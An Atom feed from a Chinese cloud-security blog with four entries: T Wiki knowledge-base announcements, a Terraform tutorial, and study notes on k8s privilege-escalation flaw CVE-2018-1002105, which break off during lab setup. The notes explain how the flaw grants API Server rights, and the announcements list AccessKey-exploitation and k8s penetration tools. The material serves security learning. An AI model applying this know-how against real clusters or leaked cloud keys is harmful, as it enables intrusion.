<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TeamsSix</title>
  
  
  <link href="https://www.teamssix.com/atom.xml" rel="self"/>
  
  <link href="https://www.teamssix.com/"/>
  <updated>2022-04-29T03:42:13.265Z</updated>
  <id>https://www.teamssix.com/</id>
  
  <author>
    <name>TeamsSix</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>T Wiki 云安全知识库本月更新汇总</title>
    <link href="https://www.teamssix.com/220430-111257.html"/>
    <id>https://www.teamssix.com/220430-111257.html</id>
    <published>2022-04-30T03:12:57.000Z</published>
    <updated>2022-04-29T03:42:13.265Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>T Wiki 自 4 月 16 日上线以来，收到不少师傅的支持与反馈，此时正好到月末，特此整理下这段时间来 T Wiki 上所更新的内容，如果你还不知道 T Wiki 是什么，可以查看这篇文章<a href="https://teamssix.com/220415-210629.html">T Wiki 云安全知识文库上线</a>，或者访问 T Wiki 地址： <a href="https://wiki.teamssix.com/">wiki.teamssix.com</a></p><h2 id="Listen-to-me，Thank-you"><a href="#Listen-to-me，Thank-you" class="headerlink" title="Listen to me，Thank you"></a>Listen to me，Thank you</h2><p>自 4 月 16 日至 4 月 30 日，总共收到了 7 位师傅的补充，分别为 1derian、ShangRui-hash、半人间丶、UzJu、Idle Life、zhengjim、zxynull</p><p><a href="https://wiki.teamssix.com" target="_blank"><img width="700" src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204291134305.png"></a></p><p>补充内容如下：</p><p><strong>1derian &amp; ShangRui-hash</strong></p><ul><li>AWS 云平台 AccessKey 泄漏利用工具 awsKeyTools</li></ul><p><strong>半人间丶</strong></p><ul><li>在线多云管理平台 行云管家</li><li>阿里云官方 OSS 浏览工具</li><li>云存储管理客户端 qiniuClient</li><li>阿里云 AccessKey 利用工具 aliyun-accesskey-Tools</li><li>阿里云 ECS、策略组辅助小工具 alicloud-tools</li><li>阿里云 AccessKey 泄漏利用工具 AliyunAccessKeyTools</li></ul><p><strong>UzJu</strong></p><ul><li>k8s 集群风险权限扫描工具 KubiScan</li><li>K8s 靶场部署工具 Kubernetes Goat</li></ul><p><strong>Idle Life</strong></p><ul><li>k8s 渗透测试工具 Peirates</li><li>容器渗透测试工具 BOtB</li></ul><p><strong>zhengjim</strong></p><ul><li>CIS 基准检测手册</li><li>CIS 基准检测工具 kube bench</li><li>k8s 集群安全漏洞发现工具 kube hunter</li><li>k8s 安全审计工具 kubestriker</li><li>基于 kubectl 的红队 k8s 安全评估工具 red kube</li><li>容器利用工具 CCAT</li></ul><p><strong>zxynull</strong></p><ul><li>Container Security Checklist</li><li>Docker 核心技术与实现原理</li><li>浅谈 Linux Cgroup机制</li><li>使用 eBPF 逃逸容器技术分析与实践</li><li>内核态eBPF程序实现容器逃逸与隐藏账号 rootkit</li><li>基于 eBPF 实现容器运行时安全</li><li>Linux云计算网络</li><li>腾讯玄武实验室</li><li>云原生技术社区</li><li>进击云原生</li><li>一个支持在线分析容器镜像的网站 contains</li><li>可以检测镜像、文件系统、git存储库的漏洞以及配置问题的镜像扫描工具 trivy</li><li>容器镜像漏洞静态扫描工具 Clair</li><li>用于深度分析docker镜像，扫描容器镜像和文件系统中的漏洞的工具 Anchore</li><li>用于对 docker 镜像和容器中的木马、恶意软件、病毒等已知漏洞进行静态分析工具 Dagda</li><li>一种运行时安全工具，用于检测在 Kubernetes 上运行的主机和容器中的异常活动 Falco</li><li>带有多个自动化测试的脚本，用于检查在生产环境中部署容器的最佳实践 Docker_Bench_Security</li><li>原生支持云云原生通用性系统可见性工具 sysdig</li><li>容器镜像分析工具 DIVE</li></ul><p>共计 36 条补充更新，再次感谢各位师傅。</p><h2 id="Awesome-Cloud-Security"><a href="#Awesome-Cloud-Security" class="headerlink" title="Awesome Cloud Security"></a>Awesome Cloud Security</h2><p>Awesome Cloud Security 项目是一个云安全资源汇总的项目，这个项目内容会和 T Wiki 云安全资源板块同步更新，Awesome Cloud Security 项目地址：<a href="https://github.com/teamssix/awesome-cloud-security">github.com/teamssix/awesome-cloud-security</a></p><p>欢迎大家一起来贡献 Awesome Cloud Security 项目，一旦收到师傅们的补充贡献，Awesome Cloud Security 项目和 T Wiki 中就会出现师傅你的 ID 和头像。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204291134859.png"></p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204291134900.png"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>创建 T Wiki 和 Awesome Cloud Security 项目的起因都是因为笔者在学习云安全的过程中，发现国内这块资源属实不多，于是便想着把自己学习过程中所收集到的一些资源以及自己的笔记公开出来，希望帮助到有需要的人。</p><p><strong>“知识思想交换时出现的情况是 1+1&gt;4。不同的思想进行交换的时候，交换双方不仅保留了自己的思想，获得了对方的思想，而且在交流中还碰撞出火花，创造出全新的思想。”</strong> —— 摘自由李录著作的《文明、现代化、价值投资与中国》</p><p>我们一起补充，知识共享、互相学习，这样国内云安全资源的获取门槛就会越来越低，我们每个人会发展越来越好，国内的云安全发展也会越来越好。</p><blockquote><p> 更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152148071.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;T Wiki 自 4 月 16 日上线以来，收到不少师傅的支持与反馈，此时正好到月末，特此整理下这段时间来 T Wiki 上所更新的内容，如</summary>
      
    
    
    
    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="知识文库" scheme="https://www.teamssix.com/tags/%E7%9F%A5%E8%AF%86%E6%96%87%E5%BA%93/"/>
    
    <category term="更新汇总" scheme="https://www.teamssix.com/tags/%E6%9B%B4%E6%96%B0%E6%B1%87%E6%80%BB/"/>
    
  </entry>
  
  <entry>
    <title>TWiki 云安全知识文库上线</title>
    <link href="https://www.teamssix.com/220415-210629.html"/>
    <id>https://www.teamssix.com/220415-210629.html</id>
    <published>2022-04-15T13:06:29.000Z</published>
    <updated>2022-04-15T14:12:09.525Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>T Wiki</code> 是一个面向云安全方向的知识库，这一点是和其他文库最大的不同，也许这是国内第一个云安全知识文库？</p><p>搭建这个文库的起因是笔者发现在云安全方向的中文资料属实不多，少有的这些资料也很散乱，于是搭建了这个文库。</p><p>文库的地址为：<a href="https://wiki.teamssix.com/">wiki.teamssix.com</a></p><h2 id="文库介绍"><a href="#文库介绍" class="headerlink" title="文库介绍"></a>文库介绍</h2><p>首先来看文库首页，文库主要分成了三个板块，分别为<code>云服务</code>、<code>云原生</code>、<code>云安全资源</code></p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152146075.png"></p><p>首先来看<code>云安全资源</code>板块，这个板块是我个人觉着整个知识库较为与众不同的地方，在这里可以看到汇总的云安全资源，比如云安全相关的文章、公众号、工具、靶场等等。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152146469.png"></p><p>这部分的内容我也同步到了 Github 上单独作为一个项目，项目名称叫做 awesome-cloud-security，项目地址为：<a href="https://github.com/teamssix/awesome-cloud-security">https://github.com/teamssix/awesome-cloud-security</a></p><p>如果你知道一些比较好的云安全资源，欢迎留言补充，我会更新到这个板块中，首页的贡献者处也将出现你的身影。</p><p>在<code>云服务</code>板块可以看到云服务方向的文章、笔记</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152147429.png"></p><p>在<code>云原生</code>板块可以看到云原生方向的文章、笔记</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152147002.png"></p><p>目前文库的东西不算多，不过未来会不断更新，如果想要投稿，那么在<code>关于文库</code>中可以找到投稿的方式。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>相信通过这些资料能够在一定程度上帮助想要学习或者正在学习云安全的人，同时也欢迎读者一起来完善这个文库，从而帮助到更多的人，一起助力国内云安全的发展。</p><blockquote><p> 更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152148071.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;code&gt;T Wiki&lt;/code&gt; 是一个面向云安全方向的知识库，这一点是和其他文库最大的不同，也许这是国内第一个云安全知识文库？&lt;/p</summary>
      
    
    
    
    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="知识文库" scheme="https://www.teamssix.com/tags/%E7%9F%A5%E8%AF%86%E6%96%87%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>【云原生】Terraform 初体验</title>
    <link href="https://www.teamssix.com/220408-145622.html"/>
    <id>https://www.teamssix.com/220408-145622.html</id>
    <published>2022-04-08T06:56:22.000Z</published>
    <updated>2022-04-08T08:46:38.214Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Terraform 是一种安全有效地构建、更改和版本控制基础设施的工具(基础架构自动化的编排工具)。</p><p>简单的说就是可以通过编写一些类似于 JSON 格式的文件，直接创建一批云上的服务资源，Terraform 和  AWS 的 CloudFormation 产品有些类似，但 CloudFormation 只支持 AWS，于是 HashiCorp 公司打造了一个多云 (Multi Cloud) 的开源的基础设施即代码 (IaC) 工具，即 Terraform</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>Terraform 的安装很简单，不同操作系统的安装命令如下：</p><ul><li>Ubuntu</li></ul><pre class="line-numbers language-none"><code class="language-none">curl -fsSL https:&#x2F;&#x2F;apt.releases.hashicorp.com&#x2F;gpg | sudo apt-key add -sudo apt-add-repository -y &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;apt.releases.hashicorp.com $(lsb_release -cs) main&quot;sudo apt-get update &amp;&amp; sudo apt-get install -y terraform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>Centos</li></ul><pre class="line-numbers language-none"><code class="language-none">sudo yum install -y yum-utilssudo yum-config-manager --add-repo https:&#x2F;&#x2F;rpm.releases.hashicorp.com&#x2F;RHEL&#x2F;hashicorp.reposudo yum -y install terraform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>Mac</li></ul><pre class="line-numbers language-none"><code class="language-none">brew tap hashicorp&#x2F;tapbrew install hashicorp&#x2F;tap&#x2F;terraform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>Windows</li></ul><pre class="line-numbers language-none"><code class="language-none">choco install terraform<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者直接到 Terraform 官网下载可执行文件使用，官方下载地址：<a href="https://www.terraform.io/downloads">https://www.terraform.io/downloads</a></p><h1 id="0x02-初体验"><a href="#0x02-初体验" class="headerlink" title="0x02 初体验"></a>0x02 初体验</h1><p>在使用 Terraform 之前，需要先在对应的云厂商控制台上生成一个 Access Key，这里以在 AWS 上创建一个 S3 服务为例。</p><p>首先新建一个文件夹，例如 demo 文件夹，接着在里面创建一个 s3demo.tf 文件，文件内容如下：</p><pre class="line-numbers language-none"><code class="language-none">provider &quot;aws&quot; &#123;  region     &#x3D; &quot;us-west-1&quot;  access_key &#x3D; &quot;your-access-key&quot;  secret_key &#x3D; &quot;your-secret-key&quot;&#125;resource &quot;aws_s3_bucket&quot; &quot;b&quot; &#123;  bucket &#x3D; &quot;my-tf-test-bucket-asdqqsdasd&quot;  tags &#x3D; &#123;    Name        &#x3D; &quot;My bucket&quot;    Environment &#x3D; &quot;Dev&quot;  &#125;&#125;resource &quot;aws_s3_bucket_acl&quot; &quot;example&quot; &#123;  bucket &#x3D; aws_s3_bucket.b.id  acl    &#x3D; &quot;private&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tf 文件采用的是 HCL 格式，HCL 格式是 Terraform 所属公司 HashiCorp 自己设计的一套配置语言</p><p>在 demo 文件夹下，运行一下初始化命令，这时 Terraform 会通过官方插件仓库下载对应的 Provider 插件</p><pre class="line-numbers language-none"><code class="language-none">terraform init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081514038.png"></p><p>因为我们这里的 s3demo.tf 里的 Provider 是 AWS，所以在初始化时，Terraform 就会去下载 AWS 的 Provider 插件</p><p>在 <a href="https://registry.terraform.io/browse/providers">https://registry.terraform.io/browse/providers</a> 可以看到 Terraform 所支持的厂商，这里基本上是涵盖了大部分云厂商的。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081515182.png"></p><p>接着使用 plan 命令查看接下来将要产生的变更</p><pre class="line-numbers language-none"><code class="language-none">terraform plan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081515816.png"></p><p>如果没什么问题，就可以应用了</p><pre class="line-numbers language-none"><code class="language-none">terraform apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081516114.png"></p><p>中途会提示确认，输入 yes 即可</p><p>在 Terraform 执行完之后，查看 AWS 下的 S3 就可以看到刚刚通过 Terraform 创建的资源了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081516221.png"></p><p>这样就完成了使用 Terraform 部署云资源的一个过程，想要清理刚刚创建的资源也非常简单，直接 destroy 即可</p><pre class="line-numbers language-none"><code class="language-none">terraform destroy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081517821.png"></p><h1 id="0x03-一些有意思的"><a href="#0x03-一些有意思的" class="headerlink" title="0x03 一些有意思的"></a>0x03 一些有意思的</h1><h2 id="1、启动插件缓存"><a href="#1、启动插件缓存" class="headerlink" title="1、启动插件缓存"></a>1、启动插件缓存</h2><p>在刚刚进行 init 初始化时，Terraform 会根据 tf 文件内的 Provider 下载对应的插件，这些插件往往体积比较大，例如上面初始化时下载的 AWS Provider 体积就有两百多 M，如果不启用插件缓存，那么在每个 Terraform 项目中都会反复下载这些插件，就很浪费磁盘空间与流量，因此建议将插件缓存开启。</p><p>Windows 下是在相关用户的 %APPDATA% 目录下创建名为 “terraform.rc” 的文件，Macos 和 Linux 用户则是在用户的 home 下创建名为 “.terraformrc” 的文件</p><p>.terraformrc 文件内容为：</p><pre class="line-numbers language-none"><code class="language-none">plugin_cache_dir &#x3D; &quot;$HOME&#x2F;.terraform.d&#x2F;plugin-cache&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样每次下载 Provider 插件时，就会下载到 “$HOME/.terraform.d/plugin-cache” 目录下了，不过 Terraform 不会主动清理这个文件夹，因此可能随着插件版本的更迭，这个文件夹内会保存一些历史版本的 Provider 插件，这时就需要自己手动清理一下了。</p><h2 id="2、可视化-Terraform"><a href="#2、可视化-Terraform" class="headerlink" title="2、可视化 Terraform"></a>2、可视化 Terraform</h2><p>如果 Terraform 项目比较复杂，那么可以利用 tfviz 这个工具，可视化 Terraform 项目，tfviz 项目地址：<a href="https://github.com/steeve85/tfviz">https://github.com/steeve85/tfviz</a></p><p>安装</p><pre class="line-numbers language-none"><code class="language-none">GO111MODULE&#x3D;on go get -u github.com&#x2F;steeve85&#x2F;tfviz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>到 Terraform 项目目录下使用</p><pre class="line-numbers language-none"><code class="language-none">tfviz -input .&#x2F; -output tfimg.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081517920.png"></p><h2 id="3、Terraform-代码安全性检查"><a href="#3、Terraform-代码安全性检查" class="headerlink" title="3、Terraform 代码安全性检查"></a>3、Terraform 代码安全性检查</h2><p>如果想知道自己写的 Terraform 项目代码有没有什么安全风险，那么可以使用 tfsec 这个工具，tfsec 项目地址：<a href="https://github.com/aquasecurity/tfsec">https://github.com/aquasecurity/tfsec</a></p><p>Mac 可以直接使用 brew 安装</p><pre class="line-numbers language-none"><code class="language-none">brew install tfsec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 go install 安装</p><pre class="line-numbers language-none"><code class="language-none">go install github.com&#x2F;aquasecurity&#x2F;tfsec&#x2F;cmd&#x2F;tfsec@latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用也非常简单，直接来到 Terraform 项目目录下，使用 tfsec . 命令即可</p><pre class="line-numbers language-none"><code class="language-none">tfsec .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204081518327.png"></p><blockquote><p> 更多信息欢迎关注我的个人微信公众号：TeamsSix</p><p> 参考文章：</p><p> <a href="https://www.cnblogs.com/sparkdev/p/10052310.html">https://www.cnblogs.com/sparkdev/p/10052310.html</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;Terraform 是一种安全有效地构建、更改和版本控制基础设施的工具(基础架构自动化的编排工具)。</summary>
      
    
    
    
    <category term="云原生" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    
    <category term="云原生" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="笔记" scheme="https://www.teamssix.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="漏洞复现" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Terraform" scheme="https://www.teamssix.com/tags/Terraform/"/>
    
  </entry>
  
  <entry>
    <title>【云安全】04 k8s 提权漏洞 CVE-2018-1002105 学习</title>
    <link href="https://www.teamssix.com/220324-161756.html"/>
    <id>https://www.teamssix.com/220324-161756.html</id>
    <published>2022-03-24T08:17:56.000Z</published>
    <updated>2022-03-24T09:11:31.538Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以下内容为自己个人的学习笔记，因此内容不会多么详实；其中有些内容也许会存在错误，如有错误欢迎留言处指出，还望谅解。</p></blockquote><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>CVE-2018-1002105 是一个 k8s 提权漏洞，该漏洞允许攻击者在拥有 pod 权限的情况下，提升至 API Server 权限，当拥有  API Server 权限后，也就不难逃逸到宿主机了。</p><p>该漏洞的 CVSS 3.x 评分为 9.8 分，受影响版本如下：</p><p>Kubernetes v1.0.x-1.9.x<br>Kubernetes v1.10.0-1.10.10 (fixed in v1.10.11)<br>Kubernetes v1.11.0-1.11.4 (fixed in v1.11.5)<br>Kubernetes v1.12.0-1.12.2 (fixed in v1.12.3)</p><p>在开始学习该漏洞之前，需要先了解一下 WebSocket，WebSocket 是一种网络传输协议，位于 OSI 模型的应用层，和 HTTP 协议一样依赖于传输层的 TCP 协议。</p><p>为了实现和 HTTP 的兼容性，WebSocket 握手使用 HTTP 的 Upgrade 头，即表示从 HTTP 协议改成 WebSocket 协议，以下是一个简单的 WebSocket 握手请求。</p><p>客户端请求：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">GET /chat HTTP/1.1<span class="token key atrule">Host</span><span class="token punctuation">:</span> server.example.com<span class="token key atrule">Upgrade</span><span class="token punctuation">:</span> websocket<span class="token key atrule">Connection</span><span class="token punctuation">:</span> Upgrade<span class="token key atrule">Sec-WebSocket-Key</span><span class="token punctuation">:</span> dGhlIHNhbXBsZSBub25jZQ==<span class="token key atrule">Origin</span><span class="token punctuation">:</span> http<span class="token punctuation">:</span>//example.com<span class="token key atrule">Sec-WebSocket-Protocol</span><span class="token punctuation">:</span> chat<span class="token punctuation">,</span> superchat<span class="token key atrule">Sec-WebSocket-Version</span><span class="token punctuation">:</span> <span class="token number">13</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>服务端响应：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">HTTP/1.1 101 Switching Protocols<span class="token key atrule">Upgrade</span><span class="token punctuation">:</span> websocket<span class="token key atrule">Connection</span><span class="token punctuation">:</span> Upgrade<span class="token key atrule">Sec-WebSocket-Accept</span><span class="token punctuation">:</span> s3pPLMBiTxaQ9kYGzzhZRbK+xOo=<span class="token key atrule">Sec-WebSocket-Protocol</span><span class="token punctuation">:</span> chat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在客户端的请求中，<code>Connection: Upgrade</code> 表示客户端希望升级协议，<code>Upgrade: WebSocket</code> 表示希望升级到 WebSocket 协议。</p><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h1><p>这里以 k8s v1.11.1 版本为例，代码地址：<a href="https://github.com/kubernetes/kubernetes/archive/refs/tags/v1.11.1.tar.gz">https://github.com/kubernetes/kubernetes/archive/refs/tags/v1.11.1.tar.gz</a></p><p>在进行漏洞分析之前，可以先通过下图去了解一下客户端向 pod 执行命令的流程</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241621405.png"></p><p>通过这张图不难看出，当客户端向 Node 节点里的 Pod 发送指令时，会先经过 API Server，再到 Kubelet，CVE-2018-1002105 漏洞也是存在于这个流程中，下面先来看看 API Server 的代码，再看看 Kubelet 的代码。</p><h2 id="API-Server-代码分析"><a href="#API-Server-代码分析" class="headerlink" title="API Server 代码分析"></a>API Server 代码分析</h2><p>先找到 staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go 文件，upgradeaware.go 用来处理 API Server 的代理逻辑，在 upgradeaware.go 的 185 行有个 ServerHTTP 函数</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241622143.png"></p><p>在 187 行可以看到，ServerHTTP 函数调用了 tryUpgrade 函数，漏洞就存在于这个函数中，该函数位于 upgradeaware.go 的第 236行，下面就来分析一下这个函数。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241623296.png"></p><p>在  tryUpgrade 函数中，首先调用了 IsUpgradeRequest 函数</p><p>IsUpgradeRequest 函数会判断 HTTP 的请求包中是否存在<code>Connection: Upgrade</code>，即判断该请求是否想要升级，如果存在就会返回 True</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241623261.png"></p><p>接着回到刚才的 tryUpgrade 函数，在 tryUpgrade函数判断协议需要升级之后，建立了与后端服务器的连接</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241624195.png"></p><p>接着 tryUpgrade 函数进行了 HTTP Hijack 操作，简单的说，就是这里程序没有将 HTTP 连接交给 Go 内置的处理流程，而是自己在 TCP 的基础上进行了 HTTP 交互，这是从 HTTP 升级到 WebSocket 的关键步骤之一</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241624858.png"></p><p>然后 tryUpgrade 函数将后端针对上一次的请求响应返回给客户端</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241625276.png"></p><p> 然后使用 Goroutine 将客户端和后端服务的代理通道建立了起来</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241626310.png"></p><p>这里是 API Server 代码中的流程，下面来看看 kubelet 的流程。</p><h2 id="Kubelet-分析"><a href="#Kubelet-分析" class="headerlink" title="Kubelet 分析"></a>Kubelet 分析</h2><p>Kubelet 代码位置在 pkg/kubelet/server/server.go</p><p>在 server.go 中可以发现 Kubelet 启动时，会注册一系列的 API，/exec 也在其中，这里会主要看下 /exec 的代码</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241625425.png"></p><p>在 server.go 的第 671 行，可以看到 getExec 函数</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241627573.png"></p><p>在该函数的第 673 行，首先创建了一个 Options 实例，这里看下其中的 NewOptions 函数</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241627475.png"></p><p>在第 61 行可以看到如果请求中没有给出 stdin、stdout 和 stderr 这三个参数，这个 Options 实例将创建失败，err 参数将返回<code>you must specify at least 1 of stdin, stdout, stderr</code></p><p>这时 getExec 函数第 674 行的 if 判断将为真，此时 getExec 函数将直接返回客户端 http.StatusBadRequest 即状态码 400</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241628491.png"></p><p>这时，可以构造一下请求测试一下，可以看到确实返回了 400，和分析结果一致。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203241628793.png"></p><p>结合 API Server 的 tryUpgrade 函数代码可以发现，API Server 并没有对这种错误情况进行处理，也就是说在 API Server 中并没有对请求的返回值进行判断，不管返回值是多少都会走到下面的 Goroutine 代码中，依旧为 Kubelet 建立 WebSocket 连接。</p><p>而且因为 getExec 报错失败了，所以这种连接也没有对接到某个 Pod 上，连接也没有被销毁，客户端可以继续通过这个连接向 Kubelet 发送指令。</p><p>由于经过了 API Server 的代理，因此指令是以 API Server 的权限向 Kubelet 下发的，也就是说客户端能自由的向该 Kubelet 下发指令，而不受限制，从而实现了权限提升。</p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先需要安装低版本的 k8s，这里版本为 1.11.1</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">git clone https<span class="token punctuation">:</span>//github.com/brant<span class="token punctuation">-</span>ruan/metarget.gitcd metarget/pip3 install <span class="token punctuation">-</span>r requirements.txt./metarget cnv install cve<span class="token punctuation">-</span>2018<span class="token punctuation">-</span><span class="token number">1002105</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接着需要准备一些文件，文件地址：<a href="https://github.com/Metarget/cloud-native-security-book/tree/main/code/0403-CVE-2018-1002105">https://github.com/Metarget/cloud-native-security-book/tree/main/code/0403-CVE-2018-1002105</a></p><p>下载这些文件后，创建相应资源</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">kubectl apply <span class="token punctuation">-</span>f cve<span class="token punctuation">-</span>2018<span class="token punctuation">-</span>1002105_namespace.yamlkubectl apply <span class="token punctuation">-</span>f cve<span class="token punctuation">-</span>2018<span class="token punctuation">-</span>1002105_role.yamlkubectl apply <span class="token punctuation">-</span>f cve<span class="token punctuation">-</span>2018<span class="token punctuation">-</span>1002105_rolebinding.yamlkubectl apply <span class="token punctuation">-</span>f cve<span class="token punctuation">-</span>2018<span class="token punctuation">-</span>1002105_pod.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>配置用户认证</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">cp test<span class="token punctuation">-</span>token.csv /etc/kubernetes/pki/test<span class="token punctuation">-</span>role<span class="token punctuation">-</span>token.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 API Server 的配置文件 /etc/kubernetes/manifests/kube-apiserver.yaml 中容器的启动参数部分末尾（spec.container.command）增加一行配置</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">-</span><span class="token punctuation">-</span>token<span class="token punctuation">-</span>auth<span class="token punctuation">-</span>file=/etc/kubernetes/pki/test<span class="token punctuation">-</span>role<span class="token punctuation">-</span>token.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>等待 API Server 重启，此时场景就搭建完毕了，下面测试下，场景是否正常</p><pre 